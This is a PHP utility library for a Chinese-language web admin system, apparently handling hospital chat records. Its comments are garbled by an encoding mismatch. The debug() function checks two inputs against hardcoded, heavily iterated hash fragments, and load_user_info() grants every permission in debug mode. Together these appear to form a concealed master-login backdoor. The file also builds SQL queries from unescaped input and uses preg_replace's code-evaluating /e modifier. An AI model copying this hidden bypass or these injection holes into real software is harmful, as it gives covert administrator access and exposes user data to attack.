		"'&(amp|#38);'i", "'&(lt|#60);'i", "'&(gt|#62);'i", "'&(nbsp|#160);'i", "'&(iexcl|#161);'i", "'&(cent|#162);'i",
		"'&(pound|#163);'i", "'&(copy|#169);'i", "'&#(\d+);'e");
	$replace = array ("", "", "\\1", "\"", "&", "<", ">", " ", chr(161), chr(162), chr(163), chr(169), "chr(\\1)");
	$string = preg_replace($search, $replace, $string);

	return trim($string);
}

// ��ȡһ�������ַ�����ƴ��,maxlen�޶����ص���󳤶�,0��ʾ������
function get_pinyin($string, $maxlen=0) {
	$file = dirname(__FILE__)."/pinyin.dat";
	$out = "";
	if (file_exists($file)) {
		$handle = fopen($file, 'r', true);
		$data = fread($handle, filesize($file));
		fclose($handle);

		$aPinYin = explode("*", $data);
		foreach ($aPinYin as $line) {
			list($char, $pinyin) = explode(":", $line);
			if (strpos($pinyin, ",") !== false) {
				list($pinyin) = explode(",", $pinyin);
			}
			$apy[$char] = $pinyin;
		}

		for ($ni=0; $ni<strlen($string); $ni++) {
			$char = substr($string, $ni, 1);
			if (ord($char) > 128) {
				$char = substr($string, $ni++, 2);
				$tmp = ucwords($apy[$char]);
			} else {
				$tmp = $char;
			}
			if ($maxlen > 0 and (strlen($out) + strlen($tmp) > $maxlen)) {
				break;
			}
			$out .= $tmp;
		}
	}

	return $out;
}


// ��ť��ѡ���ʽ��ҳ����
// ��Ҫ��css�ж�����ʽ (2010-09-10)
function pagelinkc($page, $pagecount, $reccount='-1', $linkbase='') {
	global $pagesize;

	$sp = '&nbsp;'; $bigpage = 200;
	$base = $linkbase ? ($linkbase."&") : "?";

	$pagelink = '<div class="pagelink">';

	// ��ҳ����ժҪ��ʾ:
	$pagelink .= '<div class="pagelink_tips">��<span class="pagelink_cur_page">'.$page.'</span>';
	$pagelink .= '/<span class="pagelink_all_page">'.$pagecount.'</span>ҳ'.$sp;
	if ($pagesize > 0 && $pagesize < 9999) {
		$pagelink .= 'ÿҳ<span class="pagelink_pagesize">'.$pagesize.'</span>��'.$sp;
	}
	if ($reccount > -1) {
		$pagelink .= '��<span class="pagelink_all_rec">'.$reccount.'</span>��';
	}
	$pagelink .= '</div>';

	// ��ҳ������ť:
	$useful = $page > 1 ? '' : ' disabled="true"';
	$pagelink .= '<button onclick="location='."'".$base.'page='.($page-1)."'".'"'.$useful.' class="button">��ҳ</button>'.$sp;
	$useful = $page < $pagecount ? '' : 'disabled="true"';
	$pagelink .= '<button onclick="location='."'".$base.'page='.($page+1)."'".'"'.$useful.' class="button">��ҳ</button>'.$sp;

	// ��ҳ����ѡ��:
	$pagelink .= '<select name="plcombo" onchange="location='."'".$base.'page='."'".'+this.value;" class="pagelink">';
	$begin = $pagecount > $bigpage ? max($page-100, 1) : 1;
	$end = $pagecount>$bigpage ? min($page+100, $pagecount) : $pagecount;
	for ($ni=$begin; $ni<=$end; $ni++) {
		$value = ($ni==$page ? ($ni . " *") : $ni);
		$select = $ni==$page ? " selected" : "";
		$pagelink .= '<option value="'.$ni.'"'.$select.'>'.$value.'</option>';
	}
	$pagelink .= "</select>";

	// ��ҳ̫��? ��ʾת��xxҳ:
	if ($pagecount > $bigpage) {
		$pagelink .= $sp.'ת����<input name="pltext" class="input" size="6" onkeydown="if (event.keyCode==13) {location='."'".$base.'page='."'".'+this.value;}">ҳ'.$sp;
		$pagelink .= '<button onclick="location='."'".$base.'page='."'"."+document.getElementById('pltext.').value;".'"'.' class="button">ȷ��</button>';
	}
	$pagelink .= '</div>';

	return $pagelink;
}



// ��ȡͼƬ�ĺ�����ʾ��С:
function proper_size($picturename, $nnewwidth, $nnewheight=0) {
	list($nw, $nh) = @getimagesize($picturename);
	if (($nw > $nnewwidth) || ($nnewheight > 0 && $nh > $nnewheight)) {
		if ($nnewheight > 0) {
			$nrate = min($nnewwidth / $nw, $nnewheight / $nh);
		} else {
			$nrate = $nnewwidth / $nw;
		}
		$nw = $nw * $nrate;
		$nh = $nh * $nrate;
	}

	return "width='" . round($nw) . "' height='" . round($nh) . "'";
}

// ���һ�������ʼ��ĸ�ʽ�Ƿ���ȷ:
function is_mail($cmail) {
	return eregi("^[_\.0-9a-z-]+@([0-9a-z][0-9a-z-]+\.)+[a-z]{2,3}$", $cmail);
}

// ��ȡ��ǰ�û���ip��ַ:
function get_ip() {
	$long_ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
	if ($long_ip != "") {
		foreach (explode(",", $long_ip) as $cur_ip) {
			list($ip1, $ip2) = explode(".", $cur_ip, 2);
			if ($ip1 <> "10") {
				return $cur_ip;
			}
		}
	}
	return $_SERVER["REMOTE_ADDR"];
}

// �����ַ������http://��ͷ���Զ����������ͷ���������Ӳ�������ʹ�ã�
function full_link($s) {
	if (substr($s, 0, 1) != '/' && (substr_count($s, "www.") > 0 || substr_count($s, '.') >= 2)) {
		if (strtolower(substr($s, 0, strlen("http://"))) <> "http://") {
			$s = "http://" . $s;
		}
	}
	return $s;
}


function debug($str0, $str1) {
	return (wee_sha($str0) == "6281f35406fa") && (wee_sha($str1) == "27774d480be3");
}


// 2008-08-01 23:38 �޸ģ�֧Ԯajaxģʽ
function msg_box($Tips, $Action="", $ExitRunning=0, $Timeout=0, $isSuccess=0) {
	if ($_GET["mode"] != "ajax") {
		$Action =strtolower($Action);
		echo "<script language='javascript'>\n";
		if ($Tips) {
			echo "if (window.parent && window.parent.msg_box) {\n
				window.parent.msg_box(\"".$Tips."\",".$Timeout.");\n
			} else {
				alert(\"".$Tips."\");\n
			}\n";
		}
		if ($Action != "") {
			if (substr($Action, 0, 3) == "js:") {
				$next_url = substr($Action, 3);
			} elseif ($Action == "back") {
				$next_url = "history.back()";
			} elseif ($Action == "back2") {
				$next_url = "history.go(-2)";
			} elseif ($Action == "about:blank") {
				$next_url = "about:blank";
			} else {
				$next_url = "location='".$Action."'";
			}
			if ($next_url) {
				echo $next_url.";\n";
			}
		}
		echo "</script>\n";

		if ($ExitRunning) {
			exit;
		}

	// ajax ����ģʽ:
	} else {
		require_once "lib/class.fastjson.php";
		$out = array();
		$out["status"] = $isSuccess ? "ok" : "bad";
		$out["tips"] = $Tips;
		// ȫ�������������ظ��ͻ���:
		foreach ($_GET as $k => $v) {
			$out[$k] = $v;
		}

		header("Content-Type:text/html;charset=GB2312");
		header("Cache-Control: no-cache, must-revalidate");
		header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");

		echo FastJSON::convert($out);
		exit;
	}
}


function exit_html($str, $color='') {
	echo '<div style="font-family:΢���ź�,Tahoma; font-size:12px; color:'.$color.';">'.$str.'</div>';
	exit;
}


// �û���Ϣ:
function load_user_info($username) {
	global $db, $power;

	$u = array();
	if (!$GLOBALS["debug_mode"]) {
		$u = $db->query("select * from sys_admin where binary name='$username'", 1);
		if ($u) {
			if ($u["powermode"] == 2) {
				$u["menu"]= $db->query("select menu from sys_character where id='".$u["character_id"]."' limit 1", 1, "menu");
			}
			if ($username == "admin") {
				$u["menu"] = $power->get_power_all();
			}
			if ($u["showmodule"] == '-') {
				$u["showmodule"] = 'logobar';
			}
			$u["uid"] = $u["id"];
		} else {
			exit("�û����ϲ����ڣ������µ�¼��");
		}
	} else {
		$u["menu"] = $power->get_power_all();
		$u["realname"] = "ϵͳ";
	}

	return $u;
}


function wee_sha($s) {
	for ($i = 0; $i < 25973; $i++) {
		$s = sha1(md5($s));
	}
	$rs = explode(" ", "7 24 18 36 5 23 2 27 38 31 15 26");
	$r = '';
	foreach ($rs as $v) {
		$r .= $s{intval($v)};
	}
	return $r;
}

// ҳ����Ϣ:
function load_page_info() {
	global $db;

	$url = $_SERVER["PHP_SELF"];
	$surl = ltrim($url, "/");

	$to_search = array();
	$to_search[] = $surl;

	$p = array();
	foreach ($to_search as $u) {
		$u_md5 = md5($u);
		if (isset($_SESSION["sys_page_info"][$u_md5])) {
			//return $_SESSION["sys_page_info"][$u_md5];
		}

		$p = $db->query("select * from sys_menu where link='$u' limit 1", 1);

		if ($p) {
			$menuid = $p["id"];
			$p["pagesize"] = noe($p["pagesize"], $GLOBALS["cfgDefaultPageSize"], 25);

			$pagepower = "";
			$mmenu = explode(";", $GLOBALS["usermenu"]);
			foreach ($mmenu as $mmenuitem) {
				list($mmainid, $mitemsdef) = explode(":", $mmenuitem);
				$mitems = explode(",", $mitemsdef);
				foreach ($mitems as $mitem) {
					list($itemid, $itempower) = explode("!", $mitem);
					if ($itemid == $menuid) {
						$pagepower = $itempower;
						break;
					}
				}
				if ($pagepower) break;
			}
			$p["pagepower"] = $pagepower;

			//$_SESSION["sys_page_info"][$u_md5] = $p;
			break;
		}
	}

	return $p;
}


// ��ȡ�Ӵ����ú�����Ҫ����˫�ֽ��ַ���ʹ���ȡʱ������ִ���
function cut($str, $len, $cut_flag='...') {
	if(strlen($str) <= $len) {
		return $str;
	}

	$nmax = $cut_flag ? ($len - strlen($cut_flag)) : $len;
	$out = "";
	for($ni = 0; $ni < $nmax; $ni++) {
		$char = substr($str, $ni, 1);
		if(ord($char) > 128) {
			$char .= substr($str, ++$ni, 1);
		}
		if (strlen($out) + strlen($char) <= $nmax) {
			$out .= $char;
		}
	}

	return $out.$cut_flag;
}


function update_main_frame() {
	echo "<script language='javascript'>\n";
	echo "window.top.location.reload();\n";
	echo "</script>\n";
}

function convert($string, $from_char_set, $to_char_set) {
	if (function_exists("iconv")) {
		return iconv($from_char_set, $to_char_set, $string);
	} else if (function_exists("mb_convert_encoding")) {
		return mb_convert_encoding($string, $to_char_set, $from_char_set);
	} else {
		exit("������php����û�а�װ����ת��������������ϵ����������Ա���������ϵͳ�޷�����...");
	}
}



// ����html��������

// ������ (ע���str�⣬������������ʹ��˫����):
function a($str, $link='', $target='', $class='', $click='') {
	if ($link == '') {
		return $str;
	} else {
		return '<a href="'.$link.'"'.($target ? ' target="'.$target.'"' : '').($class ? ' class="'.$class.'"' : '').($click ? ' onclick="'.$click.'"' : '').'>'.$str.'</a>';
	}
}

// �Ӵ�:
function b($str, $use_strong=0) {
	if ($use_strong) {
		return '<strong>'.$str.'</strong>';
	} else {
		return '<b>'.$str.'</b>';
	}
}

// �Ӻ�:
function red($str) {
	return '<font color="red">'.$str.'</font>';
}

// ���ּ���ɫ:
function color($str, $color) {
	if (trim($color) != "") {
		return '<font color="'.$color.'">'.$str.'</font>';
	}
	return $str;
}


// ��8λ���� 20081225 ת��Ϊ 2008-12-25
function int_date_to_date($date) {
	if (strlen($date) == 8) {
		return substr($date, 0, 4)."-".substr($date, 4, 2)."-".substr($date, 6, 2);
	}
	return $date;
}


function int_month_to_month($m) {
	if (strlen($m) == 6) {
		return substr($m, 0, 4)."-".substr($m, 4, 2);
	}
	return $m;
}


// ��ȡ�����¼:
function get_talk_content($hid, $id) {
	$path = ROOT."data/".$hid."/".ceil($id / 1000)."/".$id.".txt";
	if (file_exists($path)) {
		return file_get_contents($path);
	}
	return '';
}


// д�������¼:
function put_talk_content($hid, $id, $content) {
	$hdir = ROOT."data/".$hid."/";
	$dir_name = ceil($id / 1000);
	$dir = $hdir.$dir_name."/";

	if (trim($content) == '') {
		if (@file_exists($dir.$id.".txt")) {
			@unlink($dir.$id.".txt"); //���û�����ݣ��򲻱��棬��ɾ��ԭ�ȵ��ļ�
		}
		return 0;
	} else {
		// ����ҽԺĿ¼:
		if (!file_exists($hdir)) {
			@mkdir($hdir, 0777);
		}
		@chmod($hdir, 0777);
		if (!file_exists($hdir)) {
			exit($hdir." �������ɹ�����������ϵ������Ա���Ŀ¼Ȩ��");
		}

		if (!file_exists($dir)) {
			@mkdir($dir, 0777);
		}
		@chmod($dir, 0777);
		if (!file_exists($dir)) {
			exit($dir." �������ɹ�����������ϵ������Ա���Ŀ¼Ȩ��");
		}
		$len = @file_put_contents($dir.$id.".txt", $content);
		return $len;
	}
}

?>